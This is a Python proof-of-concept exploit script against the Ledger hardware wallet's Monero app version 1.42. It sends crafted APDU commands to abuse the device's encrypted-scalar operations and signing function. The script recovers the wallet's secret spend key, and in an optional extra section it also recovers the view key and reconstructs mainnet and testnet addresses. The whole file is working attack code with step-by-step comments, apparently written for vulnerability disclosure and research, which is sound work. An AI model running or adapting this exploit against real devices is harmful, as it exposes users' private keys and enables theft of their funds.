# Ledger app Monero v1.42 PoC, spend key extraction
# pip install ledgerblue monero_agent
# @author: ph4r05

import binascii
from ledgerblue.comm import getDongle
from ledgerblue.commException import CommException
from monero_glue.xmr import crypto
from monero_glue.xmr.sub import addr, xmr_net

MONERO_VER = b'0.15.0.0'

# binascii.hexlify(crypto.encodepoint(crypto.scalarmult_base(crypto.sc_init(1))))
PT_BASE = binascii.unhexlify(b'5866666666666666666666666666666666666666666666666666666666666666')

# binascii.hexlify(crypto.encodepoint(crypto.scalarmult_base(crypto.sc_init(0))))
PT_IDENT = binascii.unhexlify(b'0100000000000000000000000000000000000000000000000000000000000000')

# CLS | INS | P1 | P2 | LC | OPT
# dongle = getDongle(False)  # debug flag


def ksize(x):
    return sum(len(y) for y in x) if isinstance(x, (list, tuple)) else len(x)


class PoC:
    def __init__(self, dongle, lite=True):
        self.dongle = dongle
        self.tx_open = False
        self.r = None
        self.fake_a = None
        self.fake_b = None
        self.lite = lite

    def ksize(self):
        return 64 if self.tx_open else 32

    def serkey(self, x):
        return bytearray(x[0] + x[1]) if self.tx_open else x[0]

    def fmtkey(self, x):
        return binascii.hexlify(x[0])

    def apdu(self, ins, p1=0, p2=0, opt=0, body=None):
        body = [] if not body else body
        return bytearray([0x02, ins, p1, p2, 1+len(body), opt]) + bytearray(body)

    def gen_kp(self):
        r = self.dongle.exchange(self.apdu(0x40))
        pub = r[0:32]
        sec = r[32:64], r[64:]
        return pub, sec

    def reset(self):
        r = self.dongle.exchange(self.apdu(0x02, body=bytearray(list(MONERO_VER))))
        self.tx_open = False
        return r

    def open_tx(self):
        r = self.dongle.exchange(self.apdu(0x70, body=bytearray([0, 0, 0, 0])))
        self.r = (r[1*32:2*32], r[2*32:3*32])
        self.fake_a = (r[3*32:4*32], r[4*32:5*32])
        self.fake_b = (r[5*32:6*32], r[6*32:7*32])
        self.tx_open = True

    def set_mode(self, fake=False):
        r = self.dongle.exchange(self.apdu(0x72, p1=1, body=bytearray([2 if fake else 1])))
        return r

    def sc_sub(self, a, b):
        r = self.dongle.exchange(self.apdu(0x3E, body=self.serkey(a) + self.serkey(b)))
        return r[:32], r[32:]

    def sc_add(self, a, b):
        r = self.dongle.exchange(self.apdu(0x3C, body=self.serkey(a) + self.serkey(b)))
        return r[:32], r[32:]

    def derive_secret_key(self, deriv, idx, key):
        if idx != 0: raise ValueError('Not supported now')
        r = self.dongle.exchange(self.apdu(0x38, body=self.serkey(deriv) + bytearray([0, 0, 0, 0]) + self.serkey(key)))
        return r[:32], r[32:]

    def mlsag_sign_s(self, xx, alpha):
        r = self.dongle.exchange(self.apdu(0x7E, p1=0x03, p2=1, body=self.serkey(xx) + self.serkey(alpha)))
        return r[:32], None

    def get_subaddress_secret_key(self, sec, index=None):
        r = self.dongle.exchange(self.apdu(0x4C, body=self.serkey(sec) + bytearray([0]*8)))
        return r[:32], r[32:]

    def scalarmult(self, sec, pub=PT_BASE):
        r = self.dongle.exchange(self.apdu(0x42, body=pub + self.serkey(sec)))
        return r[:32]

    def poc(self):
        print('[+] PoC Ledger-app-Monero 1.42 spend key extraction')
        self.reset()
        self.set_mode()
        self.open_tx()

        # 1. call `monero_apdu_generate_keypair()`, obtain `{enc(x), hmac(enx(x))}`, where `x` is unknown.
        _, sec = self.gen_kp()
        print('  1. rsec: %s' % self.fmtkey(sec))

        # 2. call `sc_sub(enc(x), hmac(enc(x)), enc(x), hmac(enc(x)))`, obtain `{enc(0), hmac(enc(0))}`
        zero = self.sc_sub(sec, sec)
        print('  2. zero: %s' % self.fmtkey(zero))

        # 3. call `monero_apdu_derive_secret_key(
        #             enc(0), hmac(enc(0)), 0, C_FAKE_SEC_SPEND_KEY, hmac(C_FAKE_SEC_SPEND_KEY))`,
        #    obtain `{enc(r), hmac(enc(r))}`
        encr = self.derive_secret_key(zero, 0, self.fake_b)
        print('  3. encr: %s' % self.fmtkey(encr))

        # 4. call `monero_apdu_mlsag_sign(enc(0), hmac(enc(0)), enc(r), hmac(enc(r)))`, obtain `r`
        r = self.mlsag_sign_s(zero, encr)
        print('  4. r:  %s' % self.fmtkey(r))

        # 5. compute b: `b = r - H_s(00....00 || varint(0))`
        hs0 = crypto.hash_to_scalar(bytearray(33))
        rsc = crypto.decodeint(r[0])
        bsc = crypto.sc_sub(rsc, hs0)
        b = crypto.encodeint(bsc)
        print('  5. b:  %s' % binascii.hexlify(b))

        B = crypto.scalarmult_base(bsc)
        print('  5. B:  %s' % binascii.hexlify(crypto.encodepoint(B)))

        # 6. Verify
        BB = self.scalarmult(self.fake_b)
        print('  6. bG: %s' % binascii.hexlify(BB))

        if BB == crypto.encodepoint(B):
            print('[+] PoC successful')
        else:
            print('[-] PoC not working')

        if self.lite:
            return

        #  --- Extra ---
        # Extract view key and address reconstruction.
        # Not needed for the PoC
        print('\nExtracting view-key...')
        encr = self.derive_secret_key(zero, 0, self.fake_a)
        r = self.mlsag_sign_s(zero, encr)
        rsc = crypto.decodeint(r[0])
        asc = crypto.sc_sub(rsc, hs0)
        a = crypto.encodeint(asc)
        print('  a:  %s' % binascii.hexlify(a))

        A = crypto.scalarmult_base(asc)
        print('  A:  %s' % binascii.hexlify(crypto.encodepoint(A)))

        AA = self.scalarmult(self.fake_a)
        print('  aG: %s' % binascii.hexlify(AA))

        main_addr = addr.encode_addr(
            xmr_net.net_version(xmr_net.NetworkTypes.MAINNET),
            crypto.encodepoint(B),
            crypto.encodepoint(A),
        )

        test_addr = addr.encode_addr(
            xmr_net.net_version(xmr_net.NetworkTypes.TESTNET),
            crypto.encodepoint(B),
            crypto.encodepoint(A),
        )

        print('Mainnet address: %s' % main_addr)
        print('Testnet address: %s' % test_addr)


def main():
    dongle = getDongle(False)
    poc = PoC(dongle, True)
    poc.poc()


if __name__ == '__main__':
    main()
